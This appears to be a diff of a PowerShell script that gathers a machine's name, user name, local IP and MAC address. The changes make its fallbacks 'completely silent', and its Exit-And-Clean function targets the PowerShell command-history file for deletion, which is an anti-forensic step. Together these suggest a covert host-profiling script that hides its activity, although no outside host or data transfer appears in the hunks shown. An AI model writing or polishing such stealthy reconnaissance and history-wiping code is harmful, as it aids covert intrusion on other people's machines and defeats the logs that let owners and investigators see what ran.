@@ -18,34 +18,27 @@ try {
 $pcName = $env:COMPUTERNAME
 $userName = $env:USERNAME
 
-# Local IP – fallback to ipconfig if Get-NetIPAddress fails
+# Local IP – completely silent fallback
 $localIp = "Unknown"
 try {
-    # Try native command first
     $localIp = (Get-NetIPAddress -AddressFamily IPv4 -AddressState Preferred |
-        Where-Object InterfaceAlias -NotMatch 'Loopback' | Select-Object -First 1).IPAddress
+        Where-Object InterfaceAlias -NotMatch 'Loopback' | Select-Object -First 1 -ErrorAction Stop).IPAddress
 } catch {
     try {
-        # Fallback: parse ipconfig
         $lines = & ipconfig.exe | Select-String "IPv4 Address"
-        if ($lines.Count -gt 0) {
-            $localIp = ($lines[0] -replace '.*:\s*', '').Trim()
-        }
+        if ($lines.Count -gt 0) { $localIp = ($lines[0] -replace '.*:\s*', '').Trim() }
     } catch {}
 }
 
-# MAC Address – fallback to WMI
+# MAC Address – completely silent fallback
 $macAddress = "UNKNOWN"
 try {
-    $macAddress = (Get-NetAdapter | Where-Object Status -eq 'Up' | Select-Object -First 1).MacAddress
+    $macAddress = (Get-NetAdapter | Where-Object Status -eq 'Up' | Select-Object -First 1 -ErrorAction Stop).MacAddress
 } catch {
     try {
-        # Fallback: getmac /fo csv
         $macOutput = & getmac.exe /fo csv
         $lines = $macOutput -split "`n"
-        if ($lines.Count -ge 2) {
-            $macAddress = ($lines[1] -split ',')[0].Trim('"')
-        }
+        if ($lines.Count -ge 2) { $macAddress = ($lines[1] -split ',')[0].Trim('"') }
     } catch {}
 }
 
@@ -203,7 +196,7 @@ function Invoke-DeepClean {
 }
 
 function Exit-And-Clean {
-    # Final history cleanup (no clipboard)
+    # Final history cleanup
     try {
         $historyPaths = @(
             "$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt"
